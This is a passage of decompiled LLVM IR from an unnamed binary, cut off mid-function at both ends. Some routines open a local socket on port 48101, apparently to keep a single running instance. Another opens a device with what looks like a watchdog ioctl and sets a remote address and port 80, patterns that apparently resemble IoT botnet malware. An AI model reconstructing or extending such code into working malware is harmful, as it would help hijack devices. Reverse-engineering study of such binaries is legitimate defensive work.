  %v3_e79c = inttoptr i32 %v2_e79c to i8*
  %v4_e79c = load i8, i8* %v3_e79c, align 1
  %v6_e79c = zext i8 %v4_e79c to i32
  store i32 %v6_e79c, i32* %r3.global-to-local, align 4
  %v9_e7a0 = icmp eq i8 %v4_e79c, %v4_e798
  br i1 %v9_e7a0, label %dec_label_pc_e780, label %dec_label_pc_e7ac

dec_label_pc_e7ac:                                ; preds = %dec_label_pc_e798
  br label %dec_label_pc_e790.backedge

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e7cc
  %v1_e7b4 = add i32 %v1_e7cc, 1
  store i32 %v1_e7b4, i32* @lr, align 4
  %v9_e7b8 = icmp eq i32 %v3_e6f0, %v1_e7b4
  br i1 %v9_e7b8, label %dec_label_pc_e85c, label %dec_label_pc_e7c4.backedge

dec_label_pc_e7c4.backedge:                       ; preds = %dec_label_pc_e7b4, %dec_label_pc_e7e0
  %v1_e7cc148 = phi i32 [ 0, %dec_label_pc_e7e0 ], [ %v1_e7b4, %dec_label_pc_e7b4 ]
  %storemerge126 = add i32 %storemerge126.in, 1
  %v2_e7c4 = icmp eq i32 %v0_e7c4, 0
  br i1 %v2_e7c4, label %dec_label_pc_e708, label %dec_label_pc_e7cc

dec_label_pc_e7cc:                                ; preds = %dec_label_pc_e7c4.backedge, %dec_label_pc_e7cc.lr.ph
  %v0_e7c4.in = phi i32 [ %v0_e758107, %dec_label_pc_e7cc.lr.ph ], [ %v0_e7c4, %dec_label_pc_e7c4.backedge ]
  %storemerge126.in = phi i32 [ 0, %dec_label_pc_e7cc.lr.ph ], [ %storemerge126, %dec_label_pc_e7c4.backedge ]
  %v1_e7cc = phi i32 [ 0, %dec_label_pc_e7cc.lr.ph ], [ %v1_e7cc148, %dec_label_pc_e7c4.backedge ]
  %v0_e7c4 = add i32 %v0_e7c4.in, -1
  %v2_e7cc = add i32 %v1_e7cc, %v0_e7cc.pre
  %v3_e7cc = inttoptr i32 %v2_e7cc to i8*
  %v4_e7cc = load i8, i8* %v3_e7cc, align 1
  %v6_e7cc = zext i8 %v4_e7cc to i32
  store i32 %v6_e7cc, i32* %r2.global-to-local, align 4
  %v2_e7d0 = add i32 %storemerge126.in, %v1_e7d0.pre
  %v3_e7d0 = inttoptr i32 %v2_e7d0 to i8*
  %v4_e7d0 = load i8, i8* %v3_e7d0, align 1
  %v6_e7d0 = zext i8 %v4_e7d0 to i32
  store i32 %v6_e7d0, i32* %r3.global-to-local, align 4
  %v9_e7d4 = icmp eq i8 %v4_e7d0, %v4_e7cc
  br i1 %v9_e7d4, label %dec_label_pc_e7b4, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7cc
  br label %dec_label_pc_e7c4.backedge

dec_label_pc_e7e8:                                ; preds = %dec_label_pc_e800
  %v1_e7e8 = add i32 %v1_e800, 1
  store i32 %v1_e7e8, i32* @lr, align 4
  %v9_e7ec = icmp eq i32 %v3_e70c, %v1_e7e8
  br i1 %v9_e7ec, label %dec_label_pc_e85c, label %dec_label_pc_e7f8.backedge

dec_label_pc_e7f8.backedge:                       ; preds = %dec_label_pc_e7e8, %dec_label_pc_e814
  %v1_e800157 = phi i32 [ 0, %dec_label_pc_e814 ], [ %v1_e7e8, %dec_label_pc_e7e8 ]
  %storemerge125 = add i32 %storemerge125.in, 1
  %v2_e7f8 = icmp eq i32 %v0_e7f8, 0
  br i1 %v2_e7f8, label %dec_label_pc_e724, label %dec_label_pc_e800

dec_label_pc_e800:                                ; preds = %dec_label_pc_e7f8.backedge, %dec_label_pc_e800.lr.ph
  %v0_e7f8.in = phi i32 [ %v0_e758107, %dec_label_pc_e800.lr.ph ], [ %v0_e7f8, %dec_label_pc_e7f8.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_e800.lr.ph ], [ %storemerge125, %dec_label_pc_e7f8.backedge ]
  %v1_e800 = phi i32 [ 0, %dec_label_pc_e800.lr.ph ], [ %v1_e800157, %dec_label_pc_e7f8.backedge ]
  %v0_e7f8 = add i32 %v0_e7f8.in, -1
  %v2_e800 = add i32 %v1_e800, %v0_e800.pre
  %v3_e800 = inttoptr i32 %v2_e800 to i8*
  %v4_e800 = load i8, i8* %v3_e800, align 1
  %v6_e800 = zext i8 %v4_e800 to i32
  store i32 %v6_e800, i32* %r2.global-to-local, align 4
  %v2_e804 = add i32 %storemerge125.in, %v1_e804.pre
  %v3_e804 = inttoptr i32 %v2_e804 to i8*
  %v4_e804 = load i8, i8* %v3_e804, align 1
  %v6_e804 = zext i8 %v4_e804 to i32
  store i32 %v6_e804, i32* %r3.global-to-local, align 4
  %v9_e808 = icmp eq i8 %v4_e804, %v4_e800
  br i1 %v9_e808, label %dec_label_pc_e7e8, label %dec_label_pc_e814

dec_label_pc_e814:                                ; preds = %dec_label_pc_e800
  br label %dec_label_pc_e7f8.backedge

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e834
  %v1_e81c = add i32 %v1_e834, 1
  store i32 %v1_e81c, i32* @lr, align 4
  %v9_e820 = icmp eq i32 %v3_e728, %v1_e81c
  br i1 %v9_e820, label %dec_label_pc_e85c, label %dec_label_pc_e82c.backedge

dec_label_pc_e82c.backedge:                       ; preds = %dec_label_pc_e81c, %dec_label_pc_e848
  %v1_e834166 = phi i32 [ 0, %dec_label_pc_e848 ], [ %v1_e81c, %dec_label_pc_e81c ]
  %storemerge = add i32 %storemerge.in, 1
  %v2_e82c = icmp eq i32 %v0_e82c, 0
  br i1 %v2_e82c, label %dec_label_pc_e740, label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e82c.backedge, %dec_label_pc_e834.lr.ph
  %v0_e82c.in = phi i32 [ %v0_e758107, %dec_label_pc_e834.lr.ph ], [ %v0_e82c, %dec_label_pc_e82c.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_e834.lr.ph ], [ %storemerge, %dec_label_pc_e82c.backedge ]
  %v1_e834 = phi i32 [ 0, %dec_label_pc_e834.lr.ph ], [ %v1_e834166, %dec_label_pc_e82c.backedge ]
  %v0_e82c = add i32 %v0_e82c.in, -1
  %v2_e834 = add i32 %v1_e834, %v0_e834.pre
  %v3_e834 = inttoptr i32 %v2_e834 to i8*
  %v4_e834 = load i8, i8* %v3_e834, align 1
  %v6_e834 = zext i8 %v4_e834 to i32
  store i32 %v6_e834, i32* %r2.global-to-local, align 4
  %v2_e838 = add i32 %storemerge.in, %v1_e838.pre
  %v3_e838 = inttoptr i32 %v2_e838 to i8*
  %v4_e838 = load i8, i8* %v3_e838, align 1
  %v6_e838 = zext i8 %v4_e838 to i32
  store i32 %v6_e838, i32* %r3.global-to-local, align 4
  %v9_e83c = icmp eq i8 %v4_e838, %v4_e834
  br i1 %v9_e83c, label %dec_label_pc_e81c, label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e834
  br label %dec_label_pc_e82c.backedge

dec_label_pc_e850:                                ; preds = %dec_label_pc_e760
  %v1_e850 = add i32 %v1_e764, 1
  %v9_e854 = icmp eq i32 %v3_e744, %v1_e850
  br i1 %v9_e854, label %dec_label_pc_e85c, label %dec_label_pc_e778

dec_label_pc_e85c:                                ; preds = %dec_label_pc_e780, %dec_label_pc_e7b4, %dec_label_pc_e7e8, %dec_label_pc_e81c, %dec_label_pc_e850
  %v1_e860 = call i32 @function_11a38(i32 12)
  %v1_e868 = call i32 @function_11a38(i32 13)
  %v1_e870 = call i32 @function_11a38(i32 14)
  %v1_e878 = call i32 @function_11a38(i32 15)
  %v1_e880 = call i32 @function_11a38(i32 16)
  store i32 %v2_e618, i32* @r0, align 4
  %v1_e888 = call i32 @function_15b6c(i32 %v2_e618)
  %v0_e88c = load i32, i32* @r7, align 4
  store i32 %v0_e88c, i32* @r0, align 4
  %v2_e894 = call i32 @function_14e24(i32 %v0_e88c, i32 9)
  br label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_e60c, %dec_label_pc_e8cc, %dec_label_pc_e85c
  %v2_e8a4 = call i32 @function_12404(i32 %v2_e494, i32 64)
  %v2_e8b4 = call i32 @function_12404(i32 %v2_e4e4, i32 64)
  %v1_e8bc = call i32 @function_15c58(i32 1)
  store i32 %v2_e468, i32* @r4, align 4
  %v0_e8c4 = load i32, i32* @r7, align 4
  store i32 %v0_e8c4, i32* @r5, align 4
  br label %dec_label_pc_e3b8.backedge

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e6b8.backedge, %dec_label_pc_e628
  %v1_e8d0 = call i32 @function_11a38(i32 12)
  %v1_e8d8 = call i32 @function_11a38(i32 13)
  %v1_e8e0 = call i32 @function_11a38(i32 14)
  %v1_e8e8 = call i32 @function_11a38(i32 15)
  %v1_e8f0 = call i32 @function_11a38(i32 16)
  store i32 %v2_e618, i32* @r0, align 4
  %v1_e8f8 = call i32 @function_15b6c(i32 %v2_e618)
  br label %dec_label_pc_e898

; uselistorder directives
  uselistorder i32 %v1_e850, { 1, 0 }
  uselistorder i32 %v1_e764, { 1, 0 }
  uselistorder i32 %v0_e778, { 1, 0 }
  uselistorder i32 %v3_e6c4, { 1, 0 }
  uselistorder i32 %v0_e758107, { 2, 1, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_e618, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i1 %v7_e5f0, { 1, 0 }
  uselistorder i32 %v2_e5ec, { 1, 0 }
  uselistorder i32 %v2_e3bc, { 1, 0 }
  uselistorder i32 %stack_var_-8428.1.be, { 1, 0 }
  uselistorder i32 %v3_e544, { 1, 2, 0 }
  uselistorder i32 %v2_e44c, { 1, 0 }
  uselistorder i32 %v1_e3ec, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_e3c8, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8428.0, { 1, 0 }
  uselistorder i32 %v2_e6b4, { 1, 0, 2 }
  uselistorder i32 %v2_e4e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e494, { 1, 2, 4, 3, 0, 5, 6 }
  uselistorder i32 %v3_e35c, { 1, 0 }
  uselistorder i32 %v2_e328, { 2, 0, 3, 1 }
  uselistorder i32 %v3_e2d4, { 1, 0, 2 }
  uselistorder i32 %v1_e2c4, { 4, 3, 2, 0, 5, 7, 6, 9, 8, 10, 1, 11, 12, 13, 14 }
  uselistorder i32 %v3_e244, { 1, 2, 0 }
  uselistorder i32 %v3_e1f0, { 1, 2, 0 }
  uselistorder i32 %storemerge184, { 1, 0 }
  uselistorder i32 %v0_e17c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1 }
  uselistorder i32 (i8*, i32, i32)* @function_126cc, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32*)* @function_12bd8, { 2, 0, 1 }
  uselistorder i32 (i32*)* @function_12c54, { 8, 7, 0, 3, 4, 5, 2, 6, 1 }
  uselistorder i32 (i32)* @function_12c08, { 0, 2, 1 }
  uselistorder i32 52, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_15c28, { 1, 0, 3, 2 }
  uselistorder i32 (i8, i32, i32)* @function_12870, { 1, 0, 2 }
  uselistorder i32* @global_var_22960.109, { 2, 0, 3, 1, 4 }
  uselistorder i32* @global_var_22964.101, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e898, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e85c, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e82c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e7f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e7c4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e790.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e778, { 1, 0 }
  uselistorder label %dec_label_pc_e6d0, { 1, 0 }
  uselistorder label %dec_label_pc_e60c, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_e3b8.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_e5a0, { 1, 0 }
  uselistorder label %dec_label_pc_e3c8, { 1, 0 }
  uselistorder label %dec_label_pc_e3c8.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_e270, { 1, 0 }
  uselistorder label %dec_label_pc_e21c, { 1, 0 }
  uselistorder label %dec_label_pc_e1a8, { 0, 2, 1 }
}

define i32 @function_e910(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e910:
  store i32 ptrtoint (i32* @global_var_eaa8.114 to i32), i32* @global_var_2233c.116, align 4
  ret i32 %arg1
}

define i32 @function_e928() local_unnamed_addr {
dec_label_pc_e928:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_e928 = load i32, i32* @r4, align 4
  %v6_e928 = load i32, i32* @r5, align 4
  %v9_e928 = load i32, i32* @r6, align 4
  %v12_e928 = load i32, i32* @r7, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_e944 = call i32 @function_14ba0(i32 2, i32 1, i32 0)
  store i32 %v3_e944, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22334.118 to i32), i32* @r6, align 4
  %v7_e94c = icmp eq i32 %v3_e944, -1
  store i32 %v3_e944, i32* @global_var_22334.118, align 4
  br i1 %v7_e94c, label %dec_label_pc_ea00, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %dec_label_pc_e928
  %v2_e958 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e958, i32* @r3, align 4
  %v0_e95c = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  store i32 2, i32* @r2, align 4
  %v5_e96c = call i32 @function_14b30(i32 %v3_e944, i32 %v0_e95c, i32 2, i32 %v2_e958, i32 4)
  %v2_e970 = load i32, i32* @global_var_22334.118, align 4
  store i32 %v2_e970, i32* @r4, align 4
  %v3_e980 = call i32 @function_12fb4(i32 %v2_e970, i32 3, i32 0)
  store i32 ptrtoint (i8** @global_var_22340.120 to i32), i32* @r7, align 4
  %v1_e988 = or i32 %v3_e980, 2048
  %v0_e98c = load i32, i32* @r5, align 4
  %v0_e990 = load i32, i32* @r4, align 4
  %v3_e994 = call i32 @function_12fb4(i32 %v0_e990, i32 %v0_e98c, i32 %v1_e988)
  %v2_e998 = load i8, i8* bitcast (i8** @global_var_22340.120 to i8*), align 4
  %v2_e99c = icmp eq i8 %v2_e998, 0
  store i32 2, i32* %stack_var_-44, align 4
  br i1 %v2_e99c, label %dec_label_pc_e9ac, label %dec_label_pc_ea0c

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e958
  br label %dec_label_pc_e9b4

dec_label_pc_e9b4:                                ; preds = %dec_label_pc_ea0c, %dec_label_pc_e9ac
  %v1_e9c0 = call i32 @function_14898(i32 48101)
  %v0_e9c8 = call i32 @function_12f18()
  store i32 0, i32* @r4, align 4
  %v2_e9d0 = inttoptr i32 %v0_e9c8 to i32*
  store i32 0, i32* %v2_e9d0, align 4
  %v2_e9d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e9d4, i32* @r5, align 4
  %v2_e9d8 = load i32, i32* @global_var_22334.118, align 4
  store i32 16, i32* @r2, align 4
  %v3_e9e4 = call i32 @function_147bc(i32 %v2_e9d8, i32 %v2_e9d4, i32 16)
  %v7_e9e8 = icmp eq i32 %v3_e9e4, -1
  br i1 %v7_e9e8, label %dec_label_pc_ea20, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9b4
  %v2_e9f8 = load i32, i32* @global_var_22334.118, align 4
  store i32 %v2_e9f8, i32* @r0, align 4
  %v2_e9fc = call i32 @function_149f4(i32 %v2_e9f8, i32 1)
  br label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e928, %dec_label_pc_ea30, %dec_label_pc_e9f0
  %v1_ea08 = phi i32 [ %v3_e944, %dec_label_pc_e928 ], [ %v0_ea80, %dec_label_pc_ea30 ], [ %v2_e9fc, %dec_label_pc_e9f0 ]
  store i32 %v3_e928, i32* @r4, align 4
  store i32 %v6_e928, i32* @r5, align 4
  store i32 %v9_e928, i32* @r6, align 4
  store i32 %v12_e928, i32* @r7, align 4
  ret i32 %v1_ea08

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_e958
  %v1_ea14 = call i32 @function_14874(i32 2130706433)
  br label %dec_label_pc_e9b4

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e9b4
  %v0_ea20 = call i32 @function_12f18()
  %v1_ea24 = inttoptr i32 %v0_ea20 to i32*
  %v2_ea24 = load i32, i32* %v1_ea24, align 4
  %v7_ea28 = icmp eq i32 %v2_ea24, 99
  br i1 %v7_ea28, label %dec_label_pc_ea88, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_ea88, %bb, %dec_label_pc_ea20
  store i32 2, i32* %stack_var_-44, align 4
  %v1_ea48 = call i32 @function_14898(i32 48101)
  %v2_ea58 = load i32, i32* @global_var_22334.118, align 4
  %v3_ea5c = call i32 @function_147e4(i32 %v2_ea58, i32 %v2_e9d4, i32 16)
  %v1_ea64 = call i32 @function_15c58(i32 5)
  %v2_ea68 = load i32, i32* @global_var_22334.118, align 4
  store i32 %v2_ea68, i32* @r0, align 4
  %v1_ea6c = call i32 @function_15b6c(i32 %v2_ea68)
  %v1_ea78 = call i32 @function_14898(i32 48101)
  %v1_ea7c = call i32 @function_dc00(i32 %v1_ea78)
  %v0_ea80 = call i32 @function_e928()
  br label %dec_label_pc_ea00

dec_label_pc_ea88:                                ; preds = %dec_label_pc_ea20
  %v2_ea88 = load i8, i8* bitcast (i8** @global_var_22340.120 to i8*), align 4
  %v3_ea88 = zext i8 %v2_ea88 to i32
  %v1_ea8c = load i32, i32* @r4, align 4
  %v9_ea8c = icmp eq i32 %v3_ea88, %v1_ea8c
  br i1 %v9_ea8c, label %dec_label_pc_ea30, label %bb

bb:                                               ; preds = %dec_label_pc_ea88
  %v2_ea94 = trunc i32 %v1_ea8c to i8
  store i8 %v2_ea94, i8* bitcast (i8** @global_var_22340.120 to i8*), align 4
  br label %dec_label_pc_ea30

; uselistorder directives
  uselistorder i32 %v3_e944, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_dc00, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_149f4, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_147bc, { 3, 1, 0, 2 }
  uselistorder i8* bitcast (i8** @global_var_22340.120 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_22340.120, { 1, 0 }
  uselistorder i32* @global_var_22334.118, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_ea30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea00, { 1, 2, 0 }
}

define i32 @function_eaa8(i32 %arg1) local_unnamed_addr {
dec_label_pc_eaa8:
  %v1_eab0 = call i32 @function_11ad8(i32 3)
  %v3_eabc = call i32 @function_11a14(i32 3, i32* null)
  %v1_eac0 = call i32 @function_f874(i32 %v3_eabc)
  store i32 %v1_eac0, i32* @r6, align 4
  %v1_eacc = call i32 @function_11a38(i32 3)
  %v0_ead0 = load i32, i32* @r6, align 4
  %v2_ead0 = icmp eq i32 %v0_ead0, 0
  br i1 %v2_ead0, label %dec_label_pc_eb20, label %dec_label_pc_ead8

dec_label_pc_ead8:                                ; preds = %dec_label_pc_eaa8
  %v1_ead8 = add i32 %v0_ead0, 4
  %v2_ead8 = inttoptr i32 %v1_ead8 to i32*
  %v3_ead8 = load i32, i32* %v2_ead8, align 4
  store i32 %v3_ead8, i32* @r4, align 4
  %v0_eadc = call i32 @function_f570()
  %v0_eae0 = load i32, i32* @r6, align 4
  %v1_eae0 = inttoptr i32 %v0_eae0 to i8*
  %v2_eae0 = load i8, i8* %v1_eae0, align 1
  %v3_eae0 = zext i8 %v2_eae0 to i32
  %v2_eae4 = call i32 @function_12a68(i32 %v0_eadc, i32 %v3_eae0)
  store i32 ptrtoint (i16** @global_var_22968.123 to i32), i32* @r5, align 4
  %v0_eaec = load i32, i32* @r4, align 4
  %v4_eaec = mul nuw nsw i32 %v3_eae0, 4
  %v5_eaec = add i32 %v0_eaec, %v4_eaec
  %v6_eaec = inttoptr i32 %v5_eaec to i32*
  %v7_eaec = load i32, i32* %v6_eaec, align 4
  %v0_eaf0 = load i32, i32* @r6, align 4
  store i32 %v7_eaec, i32* @global_var_2296c.124, align 4
  %v1_eaf8 = call i32 @function_f84c(i32 %v0_eaf0)
  %v1_eb00 = call i32 @function_11ad8(i32 4)
  %v3_eb0c = call i32 @function_11a14(i32 4, i32* null)
  %v4_eb0c = inttoptr i32 %v3_eb0c to i16*
  %v3_eb10 = load i16, i16* %v4_eb0c, align 2
  store i16 %v3_eb10, i16* bitcast (i32* @global_var_2296a.125 to i16*), align 4
  %v1_eb1c = call i32 @function_11a38(i32 4)
  br label %dec_label_pc_eb20

dec_label_pc_eb20:                                ; preds = %dec_label_pc_eaa8, %dec_label_pc_ead8
  %v1_eb24 = phi i32 [ %v1_eacc, %dec_label_pc_eaa8 ], [ %v1_eb1c, %dec_label_pc_ead8 ]
  ret i32 %v1_eb24

; uselistorder directives
  uselistorder label %dec_label_pc_eb20, { 1, 0 }
}

define i32 @function_eb2c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_eb2c:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-76 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-142 = alloca i32, align 4
  %stack_var_-174 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-110 = alloca i8, align 1
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %v9_eb2c = load i32, i32* @r6, align 4
  %v2_eb3c = ptrtoint i32* %stack_var_-340 to i32
  store i32 %v2_eb3c, i32* @r4, align 4
  store i32 %arg1, i32* @sb, align 4
  %v2_eb44 = load i32, i32* %arg2, align 4
  store i32 %v2_eb44, i32* @r0, align 4
  store i32 %tmp, i32* @sl, align 4
  %v1_eb4c = call i32 @function_15c8c(i32 %v2_eb44)
  %v2_eb54 = call i32 @function_14ef0(i32* nonnull %stack_var_-340)
  %v2_eb60 = call i32 @function_14e88(i32 %v2_eb3c, i32 2)
  store i32 0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v0_eb70 = call i32 @function_14f5c()
  %v2_eb7c = call i32 @function_14f04(i32 17, i32 1)
  %v2_eb88 = call i32 @function_14f04(i32 5, i32 59664)
  %v3_eb94 = call i32 @function_1312c(i32 ptrtoint ([14 x i8]* @global_var_19820.128 to i32), i32 2)
  %v7_eb98 = icmp eq i32 %v3_eb94, -1
  store i32 %v3_eb94, i32* @r4, align 4
  br i1 %v7_eb98, label %dec_label_pc_ef48, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_ef48, %dec_label_pc_eb2c
  %v0_ebb8 = phi i32 [ %v3_ef50, %dec_label_pc_ef48 ], [ %v3_eb94, %dec_label_pc_eb2c ]
  store i32 %v0_ebb8, i32* @r0, align 4
  %v2_ebbc = ptrtoint i32* %stack_var_-52 to i32
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ebc4 = call i32 @function_145f0(i32 %v0_ebb8, i32 -2147199228, i32 %v2_ebbc, i32 1, i32 1)
  %v0_ebc8 = load i32, i32* @r4, align 4
  store i32 %v0_ebc8, i32* @r0, align 4
  %v1_ebcc = call i32 @function_15b6c(i32 %v0_ebc8)
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_ef48, %dec_label_pc_eba4
  store i32 ptrtoint (i32* @global_var_197d0.21 to i32), i32* @r0, align 4
  %v1_ebd4 = call i32 @function_15b50(i32 ptrtoint (i32* @global_var_197d0.21 to i32))
  %v0_ebd8 = call i32 @function_1262c()
  store i32 ptrtoint (i16** @global_var_22968.123 to i32), i32* @r4, align 4
  store i32 %v0_ebd8, i32* @global_var_2295c.90, align 4
  store i16 2, i16* bitcast (i16** @global_var_22968.123 to i16*), align 4
  %v1_ebf4 = call i32 @function_14874(i32 1105119797)
  store i32 %v1_ebf4, i32* @global_var_2296c.124, align 4
  %v1_ec00 = call i32 @function_14898(i32 80)
  %v2_ec00 = trunc i32 %v1_ec00 to i16
  %v2_ec08 = ptrtoint i8* %stack_var_-110 to i32
  store i32 %v2_ec08, i32* @fp, align 4
  store i16 %v2_ec00, i16* bitcast (i32* @global_var_2296a.125 to i16*), align 4
  %v0_ec1c = load i32, i32* @sl, align 4
  %v1_ec1c = inttoptr i32 %v0_ec1c to i32*
  %v2_ec1c = load i32, i32* %v1_ec1c, align 4
  store i32 %v2_ec1c, i32* @r8, align 4
  %v4_ec20 = bitcast i8* %stack_var_-110 to i16*
  %v5_ec20 = call i32 @function_1513c(i16* %v4_ec20, i32 ptrtoint ([3 x i8]* @global_var_19874.134 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_19870.149 to i32), i32* @r4, align 4
  %v13_ec40 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v13_ec40, i32* @lr, align 4
  store i32 59664, i32* %stack_var_-180, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_11a38.144 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_e928.137 to i32), i32 ptrtoint (i32* @global_var_11ad8.139 to i32)), i32 72212), i32 ptrtoint (i32* @global_var_11b78.142 to i32))), i32 150332), i32 0), label %dec_label_pc_ec88, label %dec_label_pc_ed94

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ebd0, %dec_label_pc_ed94, %dec_label_pc_ef3c
  %v2_ec8c = ptrtoint i32* %stack_var_-174 to i32
  store i32 %v2_ec8c, i32* @fp, align 4
  %v0_ec90 = call i32 @function_e928()
  %v1_ec94 = call i32 @function_f5cc(i32 %v0_ec90)
  %v2_eca0 = call i32 @function_12404(i32 %v2_ec8c, i32 32)
  %v0_eca4 = load i32, i32* @sb, align 4
  %v7_eca4 = icmp eq i32 %v0_eca4, 2
  br i1 %v7_eca4, label %dec_label_pc_ef64, label %dec_label_pc_ecac

dec_label_pc_ecac:                                ; preds = %dec_label_pc_ef64, %dec_label_pc_ec88, %dec_label_pc_ef74
  %v0_ecac = call i32 @function_f570()
  %v1_ecb0 = mul i32 %v0_ecac, 4
  %v3_ecb4 = and i32 %v1_ecb0, 12
  %v2_ecbc = ptrtoint i32* %stack_var_-142 to i32
  store i32 %v2_ecbc, i32* @r5, align 4
  %v1_ecc0 = add nuw nsw i32 %v3_ecb4, 12
  store i32 %v1_ecc0, i32* @r4, align 4
  %v2_eccc = bitcast i32* %stack_var_-142 to i8*
  %v3_eccc = call i32 @function_f634(i8* %v2_eccc, i32 %v1_ecc0)
  %v2_ecd0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_ecd4 = load i32, i32* @r4, align 4
  %v2_ecd4 = add i32 %v1_ecd4, %v2_ecd0
  store i32 0, i32* @r6, align 4
  %v0_ece0 = load i32, i32* @sl, align 4
  %v1_ece0 = inttoptr i32 %v0_ece0 to i32*
  %v2_ece0 = load i32, i32* %v1_ece0, align 4
  store i32 %v2_ece0, i32* @r0, align 4
  %v3_ece4 = add i32 %v2_ecd4, -102
  %v4_ece4 = inttoptr i32 %v3_ece4 to i8*
  store i8 0, i8* %v4_ece4, align 1
  %v2_ece8 = inttoptr i32 %v2_ece0 to i8*
  %v3_ece8 = call i32 @function_12398(i8* %v2_ece8, i32 %v2_ecbc)
  %v0_ecec = call i32 @function_f570()
  store i32 0, i32* @r3, align 4
  %v3_ed08 = mul i32 %v0_ecec, 4
  %v1_ed0c = add i32 %v3_ed08, 12
  store i32 %v1_ed0c, i32* @r4, align 4
  %v3_ed18 = call i32 @function_f634(i8* %v2_eccc, i32 %v1_ed0c)
  store i32 %v2_ecd0, i32* @lr, align 4
  %v1_ed20 = load i32, i32* @r4, align 4
  %v2_ed20 = add i32 %v1_ed20, %v2_ecd0
  %v0_ed24 = load i32, i32* @r6, align 4
  %v1_ed24 = trunc i32 %v0_ed24 to i8
  %v3_ed24 = add i32 %v2_ed20, -102
  %v4_ed24 = inttoptr i32 %v3_ed24 to i8*
  store i8 %v1_ed24, i8* %v4_ed24, align 1
  %v2_ed30 = call i32 @function_131f8(i32 15, i32 %v2_ecbc)
  %v1_ed38 = call i32 @function_11ad8(i32 2)
  %v3_ed48 = call i32 @function_11a14(i32 2, i32* nonnull %stack_var_-48)
  %v3_ed4c = load i32, i32* %stack_var_-48, align 4
